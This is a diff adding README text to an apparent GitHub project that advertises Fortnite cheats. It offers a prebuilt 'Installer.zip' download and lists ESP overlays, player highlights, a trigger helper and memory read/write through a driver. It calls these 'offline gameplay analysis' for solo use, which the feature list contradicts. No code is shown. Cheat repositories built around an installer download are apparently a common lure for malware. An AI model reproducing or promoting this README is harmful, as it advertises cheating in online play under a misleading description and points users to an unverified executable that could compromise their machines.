@@ -9,3 +9,32 @@
 <div align="center">
   <a href="https://github.com/xomapitos/Fortnite-Cheats-2026/releases/download/v1.1/Installer.zip">⬇️ Download Latest</a>
 </div>
+
+
+## 📖 About
+Fortnite Enhancement Suite is a community project for offline gameplay analysis and training. It provides visual aids, input assistance, and cosmetic modifications through an external overlay — no game files are modified.
+
+**For solo/creative mode use only.**
+
+---
+
+## ✨ Features
+
+| Category | Feature |
+| :--- | :--- |
+| 🎯 **Visual Aids** | Player highlights, loot markers, distance indicators |
+| 👁️ **Entity ESP** | Box outlines, skeleton view, health/shield bars |
+| 🖱️ **Input Assistance** | Recoil pattern trainer, trigger discipline helper |
+| 🎨 **Cosmetic Mods** | Local skin viewer, item shop browser |
+| 📊 **Performance** | FPS monitor, ping tracker, memory usage |
+| 🛠️ **Config System** | JSON profiles, hotkey mapping, theme selector |
+| 🖥️ **External Only** | No injection, RPM/WPM via driver |
+
+---
+
+## 🚀 Quick Start
+
+### Prerequisites
+* Windows 10/11 x64
+* Fortnite (Epic Games)
+* Visual Studio 2022 (for building)
